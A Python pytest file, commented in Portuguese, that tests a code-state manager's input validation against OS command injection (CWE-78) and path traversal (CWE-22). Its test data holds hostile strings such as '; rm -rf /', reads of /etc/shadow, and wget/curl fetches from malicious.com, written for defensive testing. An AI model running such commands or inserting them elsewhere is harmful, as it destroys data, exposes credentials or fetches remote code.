"""
Testes de segurança para Codebase State Manager.

Cobre:
- CWE-78: OS Command Injection
- CWE-22: Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)
"""

import os
import tempfile
from pathlib import Path
from unittest.mock import MagicMock

import pytest

from src.mcp_server.config import Settings
from src.mcp_server.models.state_model import State, Transition
from src.mcp_server.services.git_manager import GitManager
from src.mcp_server.services.state_service import StateService
from src.mcp_server.utils.validation import (
    ValidationError,
    sanitize_prompt,
    validate_path,
    validate_state_number,
)


class TestCWE78_OSCommandInjection:
    """
    CWE-78: Improper Neutralization of Special Elements used in an OS Command

    Testes para garantir que inputs maliciosos não possam executar comandos OS.
    """

    class MockStateRepository:
        def __init__(self):
            self.states = {}

        def create(self, state):
            self.states[state.state_number] = state
            return True

        def get_by_number(self, n):
            return self.states.get(n)

        def get_current(self):
            if not self.states:
                return None
            return max(self.states.values(), key=lambda s: s.state_number)

        def count(self):
            return len(self.states)

        def create_next(self, state):
            # Find next sequential number
            max_num = max(self.states.keys()) if self.states else -1
            next_num = max_num + 1
            state.state_number = next_num
            # Generate a simple hash for testing
            state.hash = f"hash{next_num}"
            self.states[next_num] = state
            return True

    class MockTransitionRepository:
        def __init__(self):
            self.transitions = {}

        def create(self, t):
            self.transitions[str(t.transition_id)] = t
            return True

        def create_next(self, transition):
            # Find next sequential ID
            max_id = max([int(k) for k in self.transitions.keys()]) if self.transitions else 0
            next_id = max_id + 1
            transition.transition_id = next_id
            self.transitions[str(next_id)] = transition
            return True

    @pytest.fixture
    def state_service(self, tmp_path):
        repo = self.MockStateRepository()
        trans_repo = self.MockTransitionRepository()
        git_manager = MagicMock()
        git_manager.get_diff.return_value = ""

        settings = Settings(
            db_mode="sqlite",
            docker_volume_name=str(tmp_path),
        )

        return StateService(
            state_repo=repo,
            transition_repo=trans_repo,
            git_manager=git_manager,
            settings=settings,
        )

    def test_semicolon_injection_blocked(self, state_service):
        """Testa que ponto e vírgula (;) é bloqueado para evitar injeção de comandos."""
        malicious_input = "正常内容; rm -rf /"

        with pytest.raises(ValidationError) as exc_info:
            sanitize_prompt(malicious_input)

        assert (
            "perigosos" in str(exc_info.value).lower() or "injection" in str(exc_info.value).lower()
        )

    def test_pipe_injection_blocked(self, state_service):
        """Testa que pipe (|) é bloqueado para evitar redirecionamento de saída."""
        malicious_input = "echo test | cat /etc/passwd"

        with pytest.raises(ValidationError):
            sanitize_prompt(malicious_input)

    def test_backtick_injection_blocked(self, state_service):
        """Testa que backticks (`) são bloqueados para evitar command substitution."""
        malicious_input = "内容 `whoami` 更多内容"

        with pytest.raises(ValidationError):
            sanitize_prompt(malicious_input)

    def test_dollar_parenthesis_injection_blocked(self, state_service):
        """Testa que $(...) é bloqueado para evitar command substitution."""
        malicious_input = "内容 $(whoami) 更多内容"

        with pytest.raises(ValidationError):
            sanitize_prompt(malicious_input)

    def test_semicolon_command_chain_blocked(self, state_service):
        """Testa encadeamento de comandos com ponto e vírgula."""
        malicious_inputs = [
            "test; cat /etc/shadow",
            "test; wget malicious.com/shell.sh",
            "test; curl malicious.com/cmd",
        ]

        for inp in malicious_inputs:
            with pytest.raises(ValidationError):
                sanitize_prompt(inp)

    def test_newline_command_injection_blocked(self, state_service):
        """Testa que caracteres de controle são removidos."""
        malicious_input = "test\x00rm -rf /"

        result = sanitize_prompt(malicious_input)
        assert "\x00" not in result

    def test_null_byte_injection_blocked(self, state_service):
        """Testa que null bytes são removidos."""
        malicious_input = "test\x00rm -rf /\x00"

        result = sanitize_prompt(malicious_input)
        assert "\x00" not in result

    def test_nested_backticks_injection_blocked(self, state_service):
        """Testa backticks aninhados."""
        malicious_input = "``whoami``"

        with pytest.raises(ValidationError):
            sanitize_prompt(malicious_input)


class TestCWE22_PathTraversal:
    """
    CWE-22: Improper Limitation of a Pathname to a Restricted Directory

    Testes para garantir que path traversal attacks são bloqueados.
    """

    def test_dot_dot_traversal_blocked(self):
        """Testa que ../ é bloqueado."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)

            with pytest.raises(ValidationError):
                validate_path("../etc/passwd", base)

    def test_dot_dot_with_slashes_variations(self):
        """Testa variações de path traversal."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            malicious_paths = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32",
                "foo/../../../etc/passwd",
                "foo/bar/../../etc/passwd",
            ]

            for path in malicious_paths:
                with pytest.raises(ValidationError):
                    validate_path(path, base)

    def test_url_encoded_traversal_blocked(self):
        """Testa que %2e%2e é detectado."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)

            with pytest.raises(ValidationError):
                validate_path("%2e%2e/etc/passwd", base)

    def test_valid_path_allowed(self):
        """Testa que paths válidos são permitidos."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            subdir = base / "subdir"
            subdir.mkdir()

            result = validate_path("subdir", base)
            assert result == subdir.resolve()

    def test_path_outside_base_rejected(self):
        """Testa que paths fora do base são rejeitados."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            other_dir = Path(tmpdir).parent / "other"

            with pytest.raises(ValidationError):
                validate_path(str(other_dir), base)

    def test_symlink_outside_base_rejected(self):
        """Testa que symlinks para fora do base são bloqueados."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            target_dir = Path(tmpdir).parent / f"target_{os.getpid()}"
            try:
                target_dir.mkdir(exist_ok=True)

                link_path = base / "link"
                try:
                    link_path.symlink_to(target_dir)

                    with pytest.raises(ValidationError):
                        validate_path("link/../../../etc/passwd", base)
                except OSError:
                    pass
            finally:
                if target_dir.exists():
                    target_dir.rmdir()


class TestSecurityIntegration:
    """Testes de integração de segurança."""

    def test_state_transition_with_malicious_prompt(self, tmp_path):
        """Testa que prompts maliciosos são bloqueados em transições."""
        from src.mcp_server.utils.init_manager import set_initialized

        class MockRepo:
            def __init__(self):
                self.states = {}

            def create(self, s):
                self.states[s.state_number] = s
                return True

            def get_current(self):
                if not self.states:
                    return None
                return max(self.states.values(), key=lambda s: s.state_number)

            def count(self):
                return len(self.states)

        class MockTransRepo:
            def create(self, t):
                return True

        git_manager = MagicMock()

        settings = Settings(
            db_mode="sqlite",
            docker_volume_name=str(tmp_path),
        )

        state_service = StateService(
            state_repo=MockRepo(),
            transition_repo=MockTransRepo(),
            git_manager=git_manager,
            settings=settings,
        )

        genesis = State(0, "Genesis", "main", "", "hash0")
        MockRepo().create(genesis)
        set_initialized(str(tmp_path), True)

        success, state, msg = state_service.new_state_transition("; rm -rf /")

        assert success is False, "Malicious prompt should be rejected"

    def test_path_with_control_chars_rejected(self):
        """Testa que paths com caracteres de controle são rejeitados."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)

            with pytest.raises(ValidationError):
                validate_path("valid\x00/../../../etc/passwd", base)

    def test_excessively_long_path_rejected(self):
        """Testa que paths muito longos são rejeitados."""
        with pytest.raises(ValidationError):
            validate_path("/" + "a" * 5000, Path("/tmp"))


class TestDefenseInDepth:
    """Testes de defesa em profundidade."""

    def test_multiple_attack_vectors_combined(self):
        """Testa múltiplos vetores de ataque combinados."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)

            combined_attack = "..//..//../etc/passwd\x00; rm -rf /"

            with pytest.raises(ValidationError):
                validate_path(combined_attack, base)

    def test_unicode_bypass_attempt_blocked(self):
        """Testa que tentativas de bypass com unicode são bloqueadas."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)

            unicode_attack = "../\u2026/etc/passwd"

            try:
                validate_path(unicode_attack, base)
            except ValidationError:
                pass

    def test_null_byte_in_path_handled(self):
        """Testa que null bytes em paths são tratados."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base = Path(tmpdir)
            subdir = base / "subdir"
            subdir.mkdir()

            path_with_null = "subdir\x00"

            try:
                validate_path(path_with_null, base)
            except (ValidationError, ValueError):
                pass
